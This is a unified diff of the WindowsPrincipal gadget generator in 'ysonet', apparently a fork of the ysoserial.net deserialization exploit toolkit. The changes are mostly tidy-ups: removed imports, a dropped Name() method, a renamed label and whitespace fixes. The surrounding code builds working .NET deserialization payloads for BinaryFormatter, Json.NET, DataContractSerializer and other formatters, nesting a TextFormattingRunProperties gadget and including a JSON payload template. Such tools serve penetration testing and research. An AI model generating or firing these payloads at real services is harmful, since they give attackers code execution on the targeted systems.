@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Runtime.Serialization;
-using System.Runtime.Serialization.Formatters.Binary;
 using System.Security.Claims;
 using System.Security.Principal;
 using ysonet.Helpers;
@@ -36,12 +34,6 @@ namespace ysonet.Generators
         {
             return new List<string> { "BinaryFormatter", "Json.NET", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
         }
-
-        public override string Name()
-        {
-            return "WindowsPrincipal";
-        }
-
         public override string Finders()
         {
             return "Steven Seeley of Qihoo 360 Vulcan Team";
@@ -54,7 +46,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived };
+            return new List<string> { GadgetTags.Bridged };
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -64,7 +56,7 @@ namespace ysonet.Generators
             //id.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
             currentWI.Actor.BootstrapContext = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs);
 
-            byte[] gadget =  (byte[]) SerializeWithNoTest(currentWI, "binaryformatter", inputArgs);
+            byte[] gadget = (byte[])SerializeWithNoTest(currentWI, "binaryformatter", inputArgs);
             string b64encoded = Convert.ToBase64String(gadget);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
@@ -189,7 +181,7 @@ namespace ysonet.Generators
                 string payload = "{\"__type\":\"WindowsPrincipal:#System.Security.Principal\",\"m_identity\":{\"System.Security.ClaimsIdentity.actor\":\"" + b64encoded + "\"}}";
 
                 // this is unsupported for this formatter
-                if (inputArgs.Minify || inputArgs.UseSimpleType){}
+                if (inputArgs.Minify || inputArgs.UseSimpleType) { }
 
                 if (inputArgs.Test)
                 {
